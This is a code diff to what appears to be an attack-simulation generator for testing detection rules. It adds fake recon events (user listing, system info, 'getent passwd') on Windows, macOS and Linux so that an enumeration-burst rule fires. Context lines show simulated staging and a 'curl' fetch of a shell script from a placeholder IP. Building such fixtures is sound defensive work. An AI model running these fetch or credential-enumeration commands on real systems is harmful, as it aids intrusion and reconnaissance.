@@ -104,6 +104,32 @@ function buildWindowsScenario(runId: string): DetonationBatch[] {
         }),
       ],
     },
+    {
+      delayMs: 1000,
+      events: [
+        // Recon sweep (T1082): three distinct discovery commands in quick
+        // succession → enumeration-burst fires, and the Monitor highlights
+        // these pids in the live process tree.
+        ev(6, "process_create", {
+          pid: 2003,
+          ppid: 2000,
+          process_name: "net.exe",
+          command_line: "net user",
+        }),
+        ev(7, "process_create", {
+          pid: 2004,
+          ppid: 2000,
+          process_name: "systeminfo.exe",
+          command_line: "systeminfo",
+        }),
+        ev(8, "process_create", {
+          pid: 2005,
+          ppid: 2000,
+          process_name: "ipconfig.exe",
+          command_line: "ipconfig /all",
+        }),
+      ],
+    },
     ...beacons.map((event, i) => ({ delayMs: i === 0 ? 1600 : 2000, events: [event] })),
     { delayMs: 1600, events: fileBurst },
     {
@@ -182,6 +208,30 @@ function buildMacosScenario(runId: string): DetonationBatch[] {
           ppid: 4000,
           process_name: "sh",
           command_line: "sh /tmp/.stage.sh",
+        }),
+      ],
+    },
+    {
+      delayMs: 1000,
+      events: [
+        // Recon sweep (T1082) — macOS discovery commands.
+        ev(5, "process_create", {
+          pid: 4003,
+          ppid: 4000,
+          process_name: "whoami",
+          command_line: "whoami",
+        }),
+        ev(6, "process_create", {
+          pid: 4004,
+          ppid: 4000,
+          process_name: "dscl",
+          command_line: "dscl . list /Users",
+        }),
+        ev(7, "process_create", {
+          pid: 4005,
+          ppid: 4000,
+          process_name: "system_profiler",
+          command_line: "system_profiler SPSoftwareDataType",
         }),
       ],
     },
@@ -274,6 +324,31 @@ function buildLinuxScenario(runId: string): DetonationBatch[] {
           ppid: 3001,
           process_name: "curl",
           command_line: "curl -s http://203.0.113.88/x.sh",
+        }),
+      ],
+    },
+    {
+      delayMs: 1000,
+      events: [
+        // Recon sweep (T1082): distinct discovery commands → the burst rule
+        // fires and the Monitor highlights these pids live.
+        ev(5, "process_create", {
+          pid: 3003,
+          ppid: 3000,
+          process_name: "whoami",
+          command_line: "whoami",
+        }),
+        ev(6, "process_create", {
+          pid: 3004,
+          ppid: 3000,
+          process_name: "uname",
+          command_line: "uname -a",
+        }),
+        ev(7, "process_create", {
+          pid: 3005,
+          ppid: 3000,
+          process_name: "getent",
+          command_line: "getent passwd",
         }),
       ],
     },
